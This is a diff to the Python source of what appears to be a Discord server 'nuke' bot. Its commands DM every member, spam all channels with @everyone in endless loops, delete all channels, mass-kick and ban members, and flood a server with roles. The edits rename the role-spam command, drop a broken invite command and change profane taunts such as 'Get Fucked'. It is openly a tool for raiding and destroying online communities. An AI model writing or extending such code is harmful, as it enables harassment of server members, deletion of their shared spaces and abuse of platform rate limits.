@@ -76,8 +76,7 @@ async def cmds(ctx):
  embed.add_field(name="message <message>", value="Dms everyone.", inline=False)
  embed.add_field(name="spam", value="Spams all channels.", inline=False)
  embed.add_field(name="spam2", value="Spams the channel.", inline=False)
- embed.add_field(name="role", value="Creates a role.", inline=False)
- embed.add_field(name="role2", value="Spams roles.", inline=False)
+ embed.add_field(name="roles", value="Spams roles.", inline=False)
  embed.add_field(name="delete", value="Deletes all channels.", inline=False)
  embed.add_field(name="channels", value="Creates channels.", inline=False)
  embed.add_field(name="kick", value="Kicks everyoner.", inline=False)
@@ -104,10 +103,6 @@ async def ban2(ctx, member : discord.Member):
     await member.ban()
     await ctx.message.delete()
 
-@bot.command(pass_context=True)
-async def invite(ctx):
-  await ctx.create_invite
-  print(invite)
 
 @bot.command(pass_context=True)
 async def message(ctx, *, message):
@@ -164,11 +159,11 @@ async def clear(ctx, amount=100000):
 
 #WARNING this command will rate limit the bot
 @bot.command(pass_context=True)
-async def role2(ctx): 
+async def roles(ctx): 
     await ctx.message.delete()
     while True:
         guild = ctx.guild
-        await guild.create_role(name="Fucked by Broski")
+        await guild.create_role(name="Get Fucked")
 
 
 @bot.command(pass_context=True)
@@ -176,7 +171,7 @@ async def spam2(ctx):
     await ctx.message.delete()
     while True:
     
-     await ctx.send("@everyone Fucked by Broski and Gamer Gang") 
+     await ctx.send("@everyone") 
 
 @bot.command(pass_context=True)
 async def spam(ctx, amount=100000):
